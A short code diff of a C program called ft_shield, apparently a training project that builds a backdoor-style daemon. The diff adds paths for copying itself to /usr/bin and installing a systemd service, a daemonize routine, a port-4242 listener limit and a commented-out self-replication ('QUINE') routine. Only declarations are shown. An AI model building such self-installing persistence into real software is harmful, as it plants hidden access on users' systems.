@@ -15,13 +15,15 @@
 #include <fcntl.h>
 #include <sys/sendfile.h>
 #include <sys/file.h>
-#include <sys/poll.h>
+#include <poll.h>
 #include <stdio.h>
 #include <stdbool.h>
 #include <sys/signalfd.h>
 #include <signal.h>
 
 #define LOCK_FILE "/var/lock/ft_shield.lock"
+#define TARGET_PATH "/usr/bin/ft_shield"
+#define SERVICE_PATH "/etc/systemd/system/ft_shield.service"
 #define MAX_CLIENTS 3
 #define PORT 4242
 
@@ -29,15 +31,16 @@
 	DAEMON
 */
 
-void	skeleton_daemon(void);
+// void	skeleton_daemon(void);
 int		check_lock_file(void);
 void	remove_lock_file(int fd);
+void	daemonize(void);
 
 /*
 	QUINE
 */
 
-void	copy_binary(void);
+// void	replicate(void);
 
 /*
 	SIGNALS
